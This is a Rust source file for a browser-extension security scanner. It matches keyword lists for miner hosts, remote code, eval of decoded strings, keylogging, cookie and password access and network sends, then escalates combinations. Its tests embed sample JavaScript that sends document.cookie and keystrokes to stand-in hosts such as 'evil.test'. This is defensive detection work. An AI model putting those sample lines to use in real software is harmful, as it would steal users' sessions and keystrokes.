/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

//! Behavioural signals, not a malware oracle.
//!
//! Each rule is a lexical signal. Signals are combined per file and across
//! the package; the report says what was found and why it can be legitimate.
//! A clean report means "no signal in this scan", never "safe".
//!
//! Installation policy:
//! - `None` / `Notice` install normally;
//! - `Warning` asks for an explicit confirmation (the UI shows evidence);
//! - `Danger` is a high-confidence combination and asks for confirmation;
//! - `Blocked` refuses automatically. It is reserved for a known miner host
//!   combined with remote-code or exfiltration behaviour, because that
//!   combination has no legitimate explanation in this context.

use std::collections::{BTreeMap, BTreeSet};

use crate::types::{SecurityFinding, SecurityLevel, SecurityReport};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Rule {
    id: &'static str,
    category: &'static str,
    level: SecurityLevel,
    needles: &'static [&'static str],
    explanation: &'static str,
}

const RULES: &[Rule] = &[
    Rule {
        id: "crypto-mining-host",
        category: "cryptomining",
        level: SecurityLevel::Medium,
        needles: &[
            "coinhive",
            "coin-hive",
            "cryptonight",
            "crypto-loot",
            "cryptoloot",
            "coinimp",
            "webminepool",
            "minero.cc",
            "monerominer",
            "deepminer",
            "jsecoin",
            "coinpot",
            "authedmine",
            "stratum+tcp",
        ],
        explanation: "names a known browser-mining service or mining protocol",
    },
    Rule {
        id: "remote-script",
        category: "remote_code",
        level: SecurityLevel::High,
        needles: &[
            "importscripts(\"http",
            "importscripts('http",
            "new worker(\"http",
            "new worker('http",
            "eval(await fetch",
            "eval(fetch(",
            ".then(eval)",
            "new function(await",
        ],
        explanation: "loads or evaluates code from a remote URL; Chrome extension policy forbids remote code",
    },
    Rule {
        id: "obfuscated-code",
        category: "dynamic_code",
        level: SecurityLevel::Medium,
        needles: &["eval(atob(", "eval(unescape(", "eval(decodeuricomponent("],
        explanation: "decodes and evaluates a string; legitimate in some minified libraries, common in droppers",
    },
    Rule {
        id: "dynamic-code",
        category: "dynamic_code",
        level: SecurityLevel::Low,
        needles: &["eval(", "new function(", "settimeout(\"", "setinterval(\""],
        explanation: "evaluates a string as code; many libraries do this, but it bypasses static review",
    },
    Rule {
        id: "key-events",
        category: "keylogging",
        level: SecurityLevel::Low,
        needles: &["keydown", "keypress", "keyup"],
        explanation: "observes keyboard input; normal for shortcuts, suspicious when sent off the extension",
    },
    Rule {
        id: "password-fields",
        category: "credentials",
        level: SecurityLevel::Medium,
        needles: &[
            "type=\"password\"",
            "type='password'",
            "input[type=password]",
            "input[type='password']",
        ],
        explanation: "reads password fields; expected for password managers, a credential-harvesting signal otherwise",
    },
    Rule {
        id: "cookie-access",
        category: "credentials",
        level: SecurityLevel::Medium,
        needles: &["document.cookie", "chrome.cookies.getall", "browser.cookies.getall"],
        explanation: "reads cookies or session material; can be required for a login flow or used to steal sessions",
    },
    Rule {
        id: "network-send",
        category: "exfiltration",
        level: SecurityLevel::Low,
        needles: &[
            "navigator.sendbeacon",
            "xmlhttprequest",
            "fetch(",
            "websocket(",
        ],
        explanation: "sends data over the network; combines with the signals above",
    },
    Rule {
        id: "privileged-api",
        category: "privilege",
        level: SecurityLevel::Medium,
        needles: &[
            "chrome.debugger",
            "browser.debugger",
            "chrome.proxy.settings",
            "chrome.management.setenabled",
            "chrome.management.uninstall",
        ],
        explanation: "requests a privileged surface that can observe or change other extensions or traffic",
    },
    Rule {
        id: "clipboard-read",
        category: "privacy",
        level: SecurityLevel::Medium,
        needles: &[
            "navigator.clipboard.readtext",
            "navigator.clipboard.read",
            "document.execcommand(\"paste\")",
        ],
        explanation: "reads the clipboard; legitimate for some tools, a common credential-theft path",
    },
];

/// Only a script-loading directive that admits a remote origin is a signal.
/// `img-src https:` is normal and must not raise the extension's level.
fn csp_allows_remote_script(csp: &str) -> bool {
    for directive in csp.split(';') {
        let mut parts = directive.split_whitespace();
        let name = parts.next().unwrap_or("");
        if name != "script-src" && name != "default-src" {
            continue;
        }
        if parts.any(|source| {
            source == "*"
                || source == "http:"
                || source == "https:"
                || source.starts_with("http://")
                || source.starts_with("https://")
        }) {
            return true;
        }
    }
    false
}

fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

fn line_of(bytes: &[u8], index: usize) -> usize {
    bytes[..index.min(bytes.len())]
        .iter()
        .filter(|b| **b == b'\n')
        .count()
        + 1
}

fn snippet(bytes: &[u8], index: usize) -> String {
    let start = index.saturating_sub(40);
    let end = (index + 120).min(bytes.len());
    let text = String::from_utf8_lossy(&bytes[start..end]);
    text.chars()
        .map(|ch| {
            if ch.is_control() && ch != '\n' {
                ' '
            } else {
                ch
            }
        })
        .take(160)
        .collect::<String>()
        .trim()
        .to_string()
}

/// Scan JavaScript/HTML text and the adapted manifest for signals.
pub fn scan(files: &BTreeMap<String, Vec<u8>>, manifest: &serde_json::Value) -> SecurityReport {
    let mut findings: Vec<SecurityFinding> = Vec::new();
    // Per file, where each category was seen. A bundle is often one huge
    // file; same-file is not the same as same-handler, so combinations use
    // byte distance as a cheap proximity signal.
    let mut positions: BTreeMap<String, BTreeMap<&'static str, Vec<usize>>> = BTreeMap::new();
    let mut seen: BTreeSet<(String, String)> = BTreeSet::new();

    for (path, bytes) in files {
        let lower: Vec<u8> = bytes.iter().map(u8::to_ascii_lowercase).collect();
        for rule in RULES {
            let mut hits = Vec::new();
            for needle in rule.needles {
                if let Some(index) = find(&lower, needle.as_bytes()) {
                    hits.push((index, *needle));
                }
            }
            let Some((index, needle)) = hits.first().copied() else {
                continue;
            };
            for (position, _) in &hits {
                positions
                    .entry(path.clone())
                    .or_default()
                    .entry(rule.category)
                    .or_default()
                    .push(*position);
            }
            if !seen.insert((rule.id.to_string(), path.clone())) {
                continue;
            }
            findings.push(SecurityFinding {
                id: rule.id.into(),
                category: rule.category.into(),
                level: rule.level,
                file: Some(path.clone()),
                line: Some(line_of(&lower, index)),
                evidence: format!("{needle} … {}", snippet(&lower, index)),
                explanation: rule.explanation.into(),
            });
            if findings.len() >= 40 {
                break;
            }
        }
        if findings.len() >= 40 {
            break;
        }
    }

    fn near(
        positions: &BTreeMap<&'static str, Vec<usize>>,
        left: &str,
        right: &str,
        window: usize,
    ) -> bool {
        let (Some(a), Some(b)) = (positions.get(left), positions.get(right)) else {
            return false;
        };
        a.iter().any(|x| b.iter().any(|y| x.abs_diff(*y) <= window))
    }

    // Manifest-level signal: a CSP that allows remote script is a hard
    // Chrome-policy violation and almost always intentional.
    let csp = match manifest.get("content_security_policy") {
        Some(serde_json::Value::String(text)) => text.clone(),
        Some(serde_json::Value::Object(map)) => map
            .values()
            .filter_map(|value| value.as_str())
            .collect::<Vec<_>>()
            .join("; "),
        _ => String::new(),
    }
    .to_ascii_lowercase();
    if csp_allows_remote_script(&csp) {
        findings.push(SecurityFinding {
            id: "remote-csp".into(),
            category: "remote_code".into(),
            level: SecurityLevel::High,
            file: Some("manifest.json".into()),
            line: None,
            evidence: "content_security_policy allows remote script sources".into(),
            explanation: "Chrome extension policy forbids remote script; the engine would block it or the page would not load it".into(),
        });
    }

    // Combination rules. These are the difference between "uses eval" and
    // "reads keys and posts them somewhere".
    let mut blocked = false;
    let mut level = SecurityLevel::None;
    let mut escalated = Vec::new();
    for (path, by_category) in &positions {
        // 2 KiB is roughly one minified module. A keydown listener and the
        // fetch that leaks it live in the same handler; two unrelated parts
        // of a 1 MB bundle do not.
        if near(by_category, "keylogging", "exfiltration", 2048) {
            escalated.push((
                "keylogging-exfiltration",
                path,
                SecurityLevel::Medium,
                "observes keyboard input and sends data over the network within 2 KiB of code",
            ));
        }
        if near(by_category, "credentials", "exfiltration", 2048) {
            escalated.push((
                "credential-exfiltration",
                path,
                SecurityLevel::Medium,
                "reads cookies or password fields and sends data over the network within 2 KiB of code",
            ));
        }
        if near(by_category, "dynamic_code", "remote_code", 2048)
            || near(by_category, "dynamic_code", "exfiltration", 2048)
        {
            escalated.push((
                "dynamic-remote",
                path,
                SecurityLevel::Medium,
                "evaluates dynamic code and loads remote data or code within 2 KiB of code",
            ));
        }
        let mining = by_category.contains_key("cryptomining");
        if mining {
            let exfil =
                by_category.contains_key("exfiltration") || by_category.contains_key("remote_code");
            if exfil {
                blocked = true;
                escalated.push((
                    "mining-exfiltration",
                    path,
                    SecurityLevel::Blocked,
                    "a known mining service is combined with remote code or data exfiltration",
                ));
            } else {
                escalated.push((
                    "mining",
                    path,
                    SecurityLevel::Medium,
                    "references a known browser-mining service",
                ));
            }
            if by_category.contains_key("privilege") {
                blocked = true;
            }
        }
    }

    for (id, path, severity, explanation) in escalated {
        if !seen.insert((id.to_string(), path.clone())) {
            continue;
        }
        findings.push(SecurityFinding {
            id: id.into(),
            category: "combination".into(),
            level: severity,
            file: Some(path.clone()),
            line: None,
            evidence: explanation.into(),
            explanation: "multiple signals in one file; review the evidence before installing"
                .into(),
        });
    }

    for finding in &findings {
        level = level.max(finding.level);
    }
    if blocked {
        level = SecurityLevel::Blocked;
    } else if level == SecurityLevel::Blocked {
        level = SecurityLevel::Critical;
    }

    let summary = if findings.is_empty() {
        "No behavioural signal in the scanned files. This is not a guarantee of safety.".into()
    } else {
        let mut by_category: BTreeMap<&str, usize> = BTreeMap::new();
        for finding in &findings {
            *by_category.entry(finding.category.as_str()).or_default() += 1;
        }
        let parts: Vec<String> = by_category
            .into_iter()
            .map(|(category, count)| format!("{category}×{count}"))
            .collect();
        format!(
            "{} signal(s): {}. Signals can be legitimate; review the evidence.",
            findings.len(),
            parts.join(", ")
        )
    };

    SecurityReport {
        level,
        findings,
        blocked,
        summary,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file(text: &str) -> BTreeMap<String, Vec<u8>> {
        let mut map = BTreeMap::new();
        map.insert("bg.js".into(), text.as_bytes().to_vec());
        map
    }

    #[test]
    fn a_known_miner_alone_warns() {
        let report = scan(
            &file("const host = 'coinhive.com';"),
            &serde_json::json!({}),
        );
        assert_eq!(report.level, SecurityLevel::Medium);
        assert!(!report.blocked);
        assert!(report.findings.iter().any(|f| f.category == "cryptomining"));
    }

    #[test]
    fn a_miner_plus_exfiltration_blocks() {
        let report = scan(
            &file("importScripts('https://coinhive.com/x.js'); navigator.sendBeacon('https://evil.test', document.cookie)"),
            &serde_json::json!({}),
        );
        assert!(report.blocked);
        assert_eq!(report.level, SecurityLevel::Blocked);
    }

    #[test]
    fn keylogging_needs_the_network_to_escalate() {
        let quiet = scan(
            &file("addEventListener('keydown', () => {});"),
            &serde_json::json!({}),
        );
        assert_eq!(quiet.level, SecurityLevel::Low);
        let loud = scan(
            &file("addEventListener('keydown', (e) => fetch('https://x.test', {body: e.key}));"),
            &serde_json::json!({}),
        );
        assert_eq!(loud.level, SecurityLevel::Medium);
        assert!(loud
            .findings
            .iter()
            .any(|f| f.id == "keylogging-exfiltration"));
    }

    #[test]
    fn a_clean_file_is_not_a_safety_claim() {
        let report = scan(
            &file("chrome.runtime.onInstalled.addListener(() => {});"),
            &serde_json::json!({}),
        );
        assert_eq!(report.level, SecurityLevel::None);
        assert!(report.summary.contains("not a guarantee"));
    }

    #[test]
    fn remote_manifest_csp_is_a_signal() {
        let report = scan(
            &BTreeMap::new(),
            &serde_json::json!({ "content_security_policy": { "extension_pages": "script-src 'self' https:" } }),
        );
        assert!(report.findings.iter().any(|f| f.id == "remote-csp"));
    }
}
